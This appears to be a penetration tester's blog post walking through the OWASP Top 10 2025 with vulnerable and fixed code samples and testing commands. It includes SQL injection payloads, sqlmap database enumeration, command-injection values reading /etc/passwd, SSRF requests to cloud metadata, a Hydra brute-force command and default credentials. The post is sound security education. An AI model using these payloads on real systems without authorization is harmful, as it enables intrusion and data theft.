---
title: OWASP Top 10 2025 - A Penetration Tester's Perspective
description: My hands-on experience testing for the OWASP Top 10 vulnerabilities and practical exploitation techniques I've encountered in the field.
date: 2025-02-05
draft: false
slug: /Insights/owasp-top-10-2025
tags:
  - OWASP
  - Web Security
  - Penetration Testing
  - Vulnerabilities
---

The OWASP Top 10 2025 continues to be the gold standard for web application security awareness. As a penetration tester, I encounter these vulnerabilities regularly in modern applications. Here's my practical take on each category with real-world examples from recent assessments.

## 🥇 A01: Broken Access Control

**What I see in the field:** This is by far the most common vulnerability I find during assessments.

### Common Scenarios

```javascript
// Vulnerable: Direct object reference
GET / api / user / 123 / profile;
// Attacker changes to: /api/user/124/profile

// Vulnerable: Missing authorization check
app.get('/admin/users', (req, res) => {
  // No check if user is actually admin!
  const users = db.getAllUsers();
  res.json(users);
});
```

### Testing Methodology

```bash
# Test for IDOR (Insecure Direct Object Reference)
curl -H "Authorization: Bearer user_token" \
  "https://target.com/api/orders/1234"

# Try accessing other user's data
curl -H "Authorization: Bearer user_token" \
  "https://target.com/api/orders/1235"

# Test privilege escalation
curl -H "Authorization: Bearer user_token" \
  "https://target.com/admin/panel"
```

### Real Impact

- **Data breach** - Access to other users' personal information
- **Financial loss** - Unauthorized transactions or account access
- **Compliance violations** - GDPR, HIPAA, PCI-DSS breaches

## 🔐 A02: Cryptographic Failures

**What I see:** Weak encryption, hardcoded secrets, and poor key management.

### Common Issues

```python
# BAD: Weak hashing
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# GOOD: Strong hashing with salt
import bcrypt
password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())

# BAD: Hardcoded secrets
API_KEY = "sk_live_abc123def456"

# GOOD: Environment variables
API_KEY = os.environ.get('API_KEY')
```

### Testing Approach

```bash
# Check for weak SSL/TLS
sslscan target.com
testssl.sh target.com

# Look for exposed secrets
grep -r "password\|secret\|key" source_code/
git log --all --full-history -- "**/*password*"

# Test encryption strength
openssl s_client -connect target.com:443 -cipher 'DES'
```

## 💉 A03: Injection

**Still prevalent:** SQL injection, NoSQL injection, command injection, LDAP injection.

### SQL Injection Examples

```sql
-- Classic SQLi payload
' OR '1'='1' --

-- Union-based extraction
' UNION SELECT username, password FROM users --

-- Time-based blind SQLi
'; WAITFOR DELAY '00:00:05' --
```

### Testing with SQLmap

```bash
# Basic SQLi test
sqlmap -u "http://target.com/search?q=test" --batch

# Advanced testing with cookies
sqlmap -u "http://target.com/profile" \
  --cookie="PHPSESSID=abc123" \
  --data="id=1" \
  --dbs

# Dump specific database
sqlmap -u "http://target.com/search?q=test" \
  -D database_name \
  --tables
```

### Command Injection

```bash
# Test for command injection
curl -X POST "http://target.com/ping" \
  -d "host=127.0.0.1; cat /etc/passwd"

# Time-based detection
curl -X POST "http://target.com/ping" \
  -d "host=127.0.0.1; sleep 10"
```

## 🏗️ A04: Insecure Design

**Design flaws** that can't be fixed with implementation changes.

### Examples I've Found

- **Password reset** without rate limiting
- **Account enumeration** through different error messages
- **Business logic bypasses** in multi-step processes

```python
# Vulnerable: Account enumeration
def login(username, password):
    user = User.find_by_username(username)
    if not user:
        return "Username not found"  # Reveals valid usernames!

    if not user.check_password(password):
        return "Invalid password"

    return "Login successful"

# Secure: Generic error message
def login(username, password):
    user = User.find_by_username(username)
    if not user or not user.check_password(password):
        return "Invalid credentials"  # Generic message

    return "Login successful"
```

## ⚙️ A05: Security Misconfiguration

**Default configurations** are often insecure.

### Common Misconfigurations

```bash
# Exposed debug information
curl -H "X-Debug: true" https://target.com/

# Default credentials
admin:admin
admin:password
root:root

# Directory listing enabled
curl https://target.com/uploads/

# Unnecessary HTTP methods
curl -X TRACE https://target.com/
curl -X OPTIONS https://target.com/
```

### Server Hardening Checklist

```nginx
# Nginx security headers
server {
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # Hide server version
    server_tokens off;

    # Disable unnecessary methods
    if ($request_method !~ ^(GET|HEAD|POST)$ ) {
        return 405;
    }
}
```

## 🔓 A06: Vulnerable and Outdated Components

**Dependency hell** - Using components with known vulnerabilities.

### Detection Tools

```bash
# Node.js projects
npm audit
npm audit fix

# Python projects
pip-audit
safety check

# Java projects
mvn dependency-check:check

# General vulnerability scanning
retire.js --path /path/to/project
```

### Automated Monitoring

```yaml
# GitHub Dependabot configuration
version: 2
updates:
  - package-ecosystem: 'npm'
    directory: '/'
    schedule:
      interval: 'daily'
    open-pull-requests-limit: 10
```

## 🆔 A07: Identification and Authentication Failures

**Weak authentication** mechanisms.

### Common Issues

```python
# Weak password policy
def is_valid_password(password):
    return len(password) >= 6  # Too weak!

# No rate limiting on login
@app.route('/login', methods=['POST'])
def login():
    # No protection against brute force!
    username = request.form['username']
    password = request.form['password']
    # ... authentication logic
```

### Brute Force Testing

```bash
# Hydra for brute force
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Burp Suite Intruder
# Use cluster bomb attack with username and password lists
```

## 🔍 A08: Software and Data Integrity Failures

**Supply chain attacks** and integrity violations.

### Testing Approach

```bash
# Check for unsigned packages
npm ls --depth=0 | grep -E "(MISSING|invalid)"

# Verify checksums
sha256sum package.tar.gz
curl -s https://registry.npmjs.org/package/-/package-1.0.0.tgz.sha

# Check for typosquatting
pip install --dry-run suspicious-package-name
```

## 📝 A09: Security Logging and Monitoring Failures

**Blind spots** in security monitoring.

### What to Log

```python
import logging

# Security events to log
def log_security_event(event_type, user_id, details):
    logging.warning(f"SECURITY_EVENT: {event_type} | User: {user_id} | Details: {details}")

# Examples
log_security_event("LOGIN_FAILURE", user_id, f"Failed login from {ip_address}")
log_security_event("PRIVILEGE_ESCALATION", user_id, f"Attempted admin access")
log_security_event("DATA_ACCESS", user_id, f"Accessed sensitive data: {resource}")
```

### Log Analysis

```bash
# Look for suspicious patterns
grep "LOGIN_FAILURE" /var/log/app.log | awk '{print $5}' | sort | uniq -c | sort -nr

# Detect brute force attempts
awk '/LOGIN_FAILURE/ {print $5}' /var/log/app.log | sort | uniq -c | awk '$1 > 10'
```

## 🌐 A10: Server-Side Request Forgery (SSRF)

**Internal network access** through vulnerable applications.

### SSRF Testing

```bash
# Basic SSRF test
curl -X POST "http://target.com/fetch" \
  -d "url=http://127.0.0.1:22"

# AWS metadata access
curl -X POST "http://target.com/fetch" \
  -d "url=http://169.254.169.254/latest/meta-data/"

# Internal port scanning
curl -X POST "http://target.com/fetch" \
  -d "url=http://192.168.1.1:3389"
```

### Prevention

```python
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        ip = ipaddress.ip_address(parsed.hostname)

        # Block private networks
        if ip.is_private or ip.is_loopback:
            return False

        # Block cloud metadata
        if str(ip) == "169.254.169.254":
            return False

        return True
    except:
        return False
```

## 🛠️ My Testing Toolkit

### Automated Scanners

- **OWASP ZAP** - Free web application scanner
- **Burp Suite Professional** - Comprehensive testing platform
- **Nuclei** - Fast vulnerability scanner with templates

### Manual Testing Tools

```bash
# My go-to commands for each vulnerability class
# A01 - Access Control
curl -H "Authorization: Bearer token" "https://target.com/api/admin"

# A02 - Crypto Failures
sslscan target.com

# A03 - Injection
sqlmap -u "https://target.com/search?q=test"

# A05 - Misconfiguration
nikto -h https://target.com

# A06 - Vulnerable Components
retire --path .
```

### Custom Scripts

```python
# OWASP Top 10 automated checker
import requests
import json

class OWASPTester:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()

    def test_broken_access_control(self):
        # Test for IDOR vulnerabilities
        pass

    def test_injection(self):
        # Test for SQL injection
        pass

    # ... other test methods
```

## 📊 Impact Assessment

When I find these vulnerabilities, here's how I typically rate them:

| Vulnerability         | Typical CVSS | Business Impact             |
| --------------------- | ------------ | --------------------------- |
| Broken Access Control | 8.5-9.5      | Data breach, financial loss |
| SQL Injection         | 8.0-9.0      | Database compromise         |
| XSS                   | 6.0-8.0      | Account takeover            |
| SSRF                  | 7.0-9.0      | Internal network access     |

## 🎯 Key Takeaways

1. **Access control** issues are everywhere - test thoroughly
2. **Injection** vulnerabilities are still common despite awareness
3. **Default configurations** are often insecure
4. **Logging** is frequently inadequate for security monitoring
5. **Regular updates** are crucial for component security

The OWASP Top 10 provides an excellent framework for security testing, but remember that it's not exhaustive. Each application has unique risks that require tailored testing approaches.

---

_Want to learn more about web application security testing? Check out my other posts on penetration testing methodology and AWS security best practices._
